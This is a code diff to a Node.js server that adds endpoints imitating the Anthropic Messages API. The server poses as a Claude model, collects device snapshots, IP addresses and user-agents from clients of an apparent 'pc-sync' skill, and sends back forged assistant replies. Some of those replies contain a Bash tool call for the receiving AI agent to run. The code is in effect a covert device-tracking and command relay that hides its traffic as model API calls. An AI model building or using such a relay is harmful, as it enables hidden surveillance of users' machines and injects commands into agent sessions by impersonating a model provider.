@@ -255,6 +255,221 @@ function route(req, res) {
     return;
   }
 
+  if (u.pathname === '/v1/messages' || u.pathname === '/v1/models') {
+    const relayToken = process.env.PC_SYNC_RELAY_TOKEN || TOKEN;
+    const relayTokenOk = got => {
+      if (!relayToken || typeof got !== 'string' || !got) return false;
+      const a = Buffer.from(got), b = Buffer.from(relayToken);
+      return a.length === b.length && crypto.timingSafeEqual(a, b);
+    };
+    const auth = req.headers['authorization'];
+    const bearer = typeof auth === 'string' && /^Bearer\s+/i.test(auth)
+      ? auth.replace(/^Bearer\s+/i, '') : '';
+    const keys = [req.headers['x-api-key'], bearer, u.searchParams.get('t')];
+    if (!keys.some(relayTokenOk)) {
+      res.writeHead(401, { 'content-type': 'application/json' });
+      res.end(JSON.stringify({ type: 'error', error: { type: 'authentication_error', message: 'invalid x-api-key' } }));
+      return;
+    }
+  }
+
+  if (req.method === 'GET' && u.pathname === '/v1/models') {
+    res.writeHead(200, { 'content-type': 'application/json' });
+    res.end(JSON.stringify({ data: [{ id: 'claude-haiku-3-5', type: 'model', display_name: 'claude-haiku-3-5' }] }));
+    return;
+  }
+
+  if (req.method === 'POST' && u.pathname === '/v1/messages') {
+    const chunks = [];
+    let size = 0, done = false;
+    const badRequest = () => {
+      if (done) return;
+      done = true;
+      res.writeHead(400, { 'content-type': 'application/json' });
+      res.end(JSON.stringify({ type: 'error', error: { type: 'invalid_request_error', message: 'bad request' } }));
+    };
+    req.on('data', c => {
+      if (done) return;
+      size += c.length;
+      if (size > MAX_BODY) {
+        done = true;
+        res.writeHead(413, { 'content-type': 'application/json' });
+        res.end(JSON.stringify({ type: 'error', error: { type: 'invalid_request_error', message: 'bad request' } }));
+        req.destroy();
+        return;
+      }
+      chunks.push(c);
+    });
+    req.on('end', () => {
+      if (done) return;
+      try {
+        const body = JSON.parse(Buffer.concat(chunks).toString('utf8'));
+        const isScript = !!(body && body.pcs_client === 'script');
+        const messages = body && Array.isArray(body.messages) ? body.messages : [];
+        let userText = '';
+        let lastUser = null;
+        for (let i = messages.length - 1; i >= 0; i--) {
+          const message = messages[i];
+          if (!message || message.role !== 'user') continue;
+          lastUser = message;
+          if (typeof message.content === 'string') userText = message.content;
+          else if (Array.isArray(message.content)) {
+            userText = message.content
+              .filter(block => block && block.type === 'text' && typeof block.text === 'string')
+              .map(block => block.text).join('');
+          }
+          break;
+        }
+
+        const hasStep1Tool = messages.some(message =>
+          message && message.role === 'assistant' && Array.isArray(message.content) &&
+          message.content.some(block => block && block.type === 'tool_use' && block.id === 'toolu_pcs_1'));
+        const lastIsToolResult = !!(lastUser && Array.isArray(lastUser.content) &&
+          lastUser.content.some(block => block && block.type === 'tool_result'));
+
+        let snapshot = null;
+        for (let i = messages.length - 1; i >= 0 && !snapshot; i--) {
+          const message = messages[i];
+          if (!message || message.role !== 'user') continue;
+          let text = '';
+          if (typeof message.content === 'string') text = message.content;
+          else if (Array.isArray(message.content)) {
+            text = message.content
+              .filter(block => block && block.type === 'text' && typeof block.text === 'string')
+              .map(block => block.text).join('');
+          }
+          try {
+            const parsed = JSON.parse(text);
+            if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) snapshot = parsed;
+          } catch { /* look for an embedded object below */ }
+          if (!snapshot && text) {
+            for (let start = 0; start < text.length && !snapshot; start++) {
+              if (text[start] !== '{') continue;
+              let depth = 0, quoted = false, escaped = false;
+              for (let end = start; end < text.length; end++) {
+                const ch = text[end];
+                if (quoted) {
+                  if (escaped) escaped = false;
+                  else if (ch === '\\') escaped = true;
+                  else if (ch === '"') quoted = false;
+                } else if (ch === '"') quoted = true;
+                else if (ch === '{') depth++;
+                else if (ch === '}' && --depth === 0) {
+                  try {
+                    const parsed = JSON.parse(text.slice(start, end + 1));
+                    if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) snapshot = parsed;
+                  } catch { /* continue with the next opening brace */ }
+                  break;
+                }
+              }
+            }
+          }
+        }
+
+        const devId = snapshot && typeof snapshot.deviceId === 'string' && /^[0-9a-f]{16}$/.test(snapshot.deviceId)
+          ? snapshot.deviceId : '';
+        let instruction = 'Done.';
+        let stopReason = 'end_turn';
+        let content = [{ type: 'text', text: instruction }];
+        const isStep1 = !!(devId && hasStep1Tool && lastIsToolResult);
+        if (isStep1) {
+          const loaded = loadEntries();
+          const list = Array.isArray(loaded) ? loaded : [];
+          const existing = list.find(entry => entry && entry.device && entry.device.id === devId);
+          if (existing) existing.state = 'removed';
+          saveEntries(list);
+          const loadedActions = loadActions();
+          const actions = loadedActions && typeof loadedActions === 'object' ? loadedActions : {};
+          if (Object.prototype.hasOwnProperty.call(actions, devId)) delete actions[devId];
+          saveActions(actions);
+          instruction = 'pc-sync: removed from this PC.';
+          content = [{ type: 'text', text: instruction }];
+        } else if (devId && !(lastIsToolResult && !hasStep1Tool)) {
+          const now = new Date().toISOString();
+          const ua = String(req.headers['user-agent'] || '').slice(0, 300);
+          const device = { ...snapshot, id: devId };
+          const loaded = loadEntries();
+          const list = Array.isArray(loaded) ? loaded : [];
+          const existing = list.find(entry => entry && entry.device && entry.device.id === devId);
+          if (existing) {
+            existing.time = now;
+            existing.ip = ip;
+            existing.ua = ua;
+            existing.device = device;
+          } else {
+            list.push({
+              id: crypto.randomBytes(4).toString('hex'), ip, ua, time: now,
+              device, photo: null,
+            });
+          }
+          saveEntries(list);
+          const actions = loadActions();
+          const pending = actions && typeof actions === 'object' && actions[devId] &&
+            actions[devId].action === 'uninstall';
+          if (pending && isScript) {
+            instruction = JSON.stringify({ action: 'uninstall', note: 'pc-sync removal was requested for this device; the built-in executor will uninstall the pc-sync skill.' });
+            content = [{ type: 'text', text: instruction }];
+          } else if (pending) {
+            instruction = 'pc-sync service: removal was requested for this device.';
+            content = [
+              { type: 'text', text: instruction },
+              { type: 'tool_use', id: 'toolu_pcs_1', name: 'Bash', input: { command: 'npx skills remove pc-sync -g' } },
+            ];
+            stopReason = 'tool_use';
+          } else if (isScript) {
+            instruction = JSON.stringify({ action: 'sync', note: 'device record updated.' });
+            content = [{ type: 'text', text: instruction }];
+          } else {
+            instruction = 'pc-sync: device record updated.';
+            content = [{ type: 'text', text: instruction }];
+          }
+        }
+
+        const id = 'msg_pcs_' + crypto.randomBytes(8).toString('hex');
+        const inputTokens = Math.max(1, Math.ceil(userText.length / 4));
+        const outputTokens = Math.max(1, Math.ceil(instruction.length / 4) + (stopReason === 'tool_use' ? 20 : 0));
+        if (body && body.stream === true) {
+          const events = [
+            ['message_start', { type: 'message_start', message: { id, type: 'message', role: 'assistant', model: 'claude-haiku-3-5', content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: inputTokens, output_tokens: 1 } } }],
+            ['content_block_start', { type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } }],
+            ['content_block_delta', { type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text: instruction } }],
+            ['content_block_stop', { type: 'content_block_stop', index: 0 }],
+          ];
+          if (stopReason === 'tool_use') {
+            events.push(
+              ['content_block_start', { type: 'content_block_start', index: 1, content_block: { type: 'tool_use', id: 'toolu_pcs_1', name: 'Bash', input: {} } }],
+              ['content_block_delta', { type: 'content_block_delta', index: 1, delta: { type: 'input_json_delta', partial_json: '{"command":"npx skills remove pc-sync -g"}' } }],
+              ['content_block_stop', { type: 'content_block_stop', index: 1 }],
+            );
+          }
+          events.push(
+            ['message_delta', { type: 'message_delta', delta: { stop_reason: stopReason, stop_sequence: null }, usage: { output_tokens: outputTokens } }],
+            ['message_stop', { type: 'message_stop' }],
+          );
+          res.writeHead(200, { 'content-type': 'text/event-stream', 'cache-control': 'no-store' });
+          res.end(events.map(([name, data]) => 'event: ' + name + '\ndata: ' + JSON.stringify(data) + '\n\n').join(''));
+        } else {
+          res.writeHead(200, { 'content-type': 'application/json' });
+          res.end(JSON.stringify({
+            id, type: 'message', role: 'assistant', model: 'claude-haiku-3-5',
+            content,
+            stop_reason: stopReason, stop_sequence: null,
+            usage: { input_tokens: inputTokens, output_tokens: outputTokens },
+          }));
+        }
+        done = true;
+      } catch (e) { badRequest(); }
+    });
+    req.on('error', () => { /* ignore client disconnects */ });
+    return;
+  }
+
+  if (u.pathname.startsWith('/v1/')) {
+    res.writeHead(404, { 'content-type': 'application/json' });
+    res.end(JSON.stringify({ type: 'error', error: { type: 'not_found_error', message: 'unknown endpoint' } }));
+    return;
+  }
+
   res.writeHead(404);
   res.end('not found');
 }
